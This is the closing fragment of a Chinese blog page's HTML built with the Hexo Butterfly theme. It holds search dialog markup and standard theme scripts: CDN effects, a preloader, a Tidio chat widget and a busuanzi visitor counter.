type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script src="//code.tidio.co/eucyopvw8zt034ovoshroc4kci4qpweh.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
